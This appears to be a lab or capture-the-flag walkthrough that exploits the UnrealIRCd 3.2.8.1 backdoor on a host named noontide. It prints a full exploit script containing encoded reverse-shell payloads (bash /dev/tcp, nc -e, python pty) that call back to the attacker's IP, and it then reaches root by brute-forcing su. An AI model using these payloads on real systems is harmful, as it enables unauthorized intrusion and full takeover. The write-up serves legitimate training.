---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Reconnaissance

### Nmap scan

Let's perform an `nmap` scan to find the open ports and the services running on the open ports.

```
$ nmap -T5 -Pn -A -p- 192.168.202.120
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-10 09:13 EDT
Warning: 192.168.202.120 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.202.120
Host is up (0.067s latency).
Not shown: 63888 closed tcp ports (conn-refused), 1644 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd (Admin email example@example.com)
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 330.87 seconds
```

There are three open ports:

| Port | Service |
| ---- | ------- |
| 6667 | irc     |
| 6697 | irc     |
| 8067 | irc     |

&nbsp;

## Exploitation
### Obtaining reverse shell
#### Using third party exploit

We can obtain a reverse shell on the target using a [this](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py) exploit.

![1](https://github.com/user-attachments/assets/6a618f70-753f-4961-9901-0ee1eaf6ab82)

```
$ wget https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py
--2024-08-10 09:52:21--  https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py
Resolving github.com (github.com)... 20.207.73.82, 64:ff9b::14cf:4952
Connecting to github.com (github.com)|20.207.73.82|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘exploit.py’

exploit.py                                                     [ <=>                                                                                                                                     ] 341.74K  --.-KB/s    in 0.01s   

2024-08-10 09:52:22 (23.4 MB/s) - ‘exploit.py’ saved [349940]
```

Once downloaded, we have to modify the exploit slightly, setting our IP address.

```python title="exploit.py"
#!/usr/bin/python3
import argparse
import socket
import base64

# Sets the target ip and port from argparse
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='target ip')
parser.add_argument('port', help='target port', type=int)
parser.add_argument('-payload', help='set payload type', required=True, choices=['python', 'netcat', 'bash'])
args = parser.parse_args()

# Sets the local ip and port (address and port to listen on)
local_ip = '192.168.45.234'  # CHANGE THIS
local_port = '9999'  # CHANGE THIS 

# The different types of payloads that are supported
python_payload = f'python -c "import os;import pty;import socket;tLnCwQLCel=\'{local_ip}\';EvKOcV={local_port};QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');QRRCCltJB.close();" '
bash_payload = f'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'
netcat_payload = f'nc -e /bin/bash {local_ip} {local_port}'

# our socket to interact with and send payload
try:
    s = socket.create_connection((args.ip, args.port))
except socket.error as error:
    print('connection to target failed...')
    print(error)
    
# craft out payload and then it gets base64 encoded
def gen_payload(payload_type):
    base = base64.b64encode(payload_type.encode())
    return f'echo {base.decode()} |base64 -d|/bin/bash'

# all the different payload options to be sent
if args.payload == 'python':
    try:
        s.sendall((f'AB; {gen_payload(python_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')

if args.payload == 'netcat':
    try:
        s.sendall((f'AB; {gen_payload(netcat_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')

if args.payload == 'bash':
    try:
        s.sendall((f'AB; {gen_payload(bash_payload)} \n').encode())
    except:
        print('connection made, but failed to send exploit...')
    
#check display any response from the server
data = s.recv(1024)
s.close()
if data != '':
    print('Exploit sent successfully!')
```

Let's set up a `nc` listener.

```
$ nc -nlvp 9999                     
listening on [any] 9999 ...
```

Let's send the exploit payload.

```
$ python3 exploit.py -payload bash 192.168.202.120 6697
Exploit sent successfully!
```

We can now check back on our `nc` listener.

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.45.234] from (UNKNOWN) [192.168.202.120] 42784
bash: cannot set terminal process group (433): Inappropriate ioctl for device
bash: no job control in this shell
server@noontide:~/irc/Unreal3.2$ 
```

&nbsp;

## Post Exploitation

### local.txt

```
server@noontide:~/irc/Unreal3.2$ cd /home/server
cd /home/server
```

```
server@noontide:~$ cat local.txt
cat local.txt
573899f75943f510d8807e6af75a5a71
```

### Privilege Escalation

#### Enumerating Privilege Escalation vectors using Linpeas

In order to find a privilege escalation vector we have to use the [Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240804-31b931f7) utility.

```
$ python3 -m http.server                               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
server@noontide:~$ wget http://192.168.45.234:8000/linpeas.sh
wget http://192.168.45.234:8000/linpeas.sh
--2024-08-10 10:11:55--  http://192.168.45.234:8000/linpeas.sh
Connecting to 192.168.45.234:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860335 (840K) [text/x-sh]
Saving to: ‘linpeas.sh’

     0K .......... .......... .......... .......... ..........  5%  285K 3s
    50K .......... .......... .......... .......... .......... 11%  722K 2s
   100K .......... .......... .......... .......... .......... 17%  196K 2s
   150K .......... .......... .......... .......... .......... 23% 2.08M 2s
   200K .......... .......... .......... .......... .......... 29%  824K 1s
   250K .......... .......... .......... .......... .......... 35%  888K 1s
   300K .......... .......... .......... .......... .......... 41%  980K 1s
   350K .......... .......... .......... .......... .......... 47% 1.48M 1s
   400K .......... .......... .......... .......... .......... 53%  892K 1s
   450K .......... .......... .......... .......... .......... 59%  862K 1s
   500K .......... .......... .......... .......... .......... 65% 2.07M 0s
   550K .......... .......... .......... .......... .......... 71%  874K 0s
   600K .......... .......... .......... .......... .......... 77%  836K 0s
   650K .......... .......... .......... .......... .......... 83% 1.10M 0s
   700K .......... .......... .......... .......... .......... 89% 1.35M 0s
   750K .......... .......... .......... .......... .......... 95%  879K 0s
   800K .......... .......... .......... ..........           100% 2.11M=1.1s

2024-08-10 10:11:57 (740 KB/s) - ‘linpeas.sh’ saved [860335/860335]
```

Let's make it executable.

```
server@noontide:~$ chmod +x linpeas.sh                 
chmod +x linpeas.sh
```

We can use the `-a` option for brute-forcing.

```
server@noontide:~$ ./linpeas.sh -a
./linpeas.sh -a

<SNIP>

╔══════════╣ Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
                                                                           
  Bruteforcing user root...
  You can login as root using password: root

<SNIP>
```

### Logging in as the `root` user

```
server@noontide:~$ su root
su root
Password: root
```

```
whoami
root
```

### proof.txt

```
cat /root/proof.txt
8b06a7b03fb1b275742e0e3f1aec0569
```
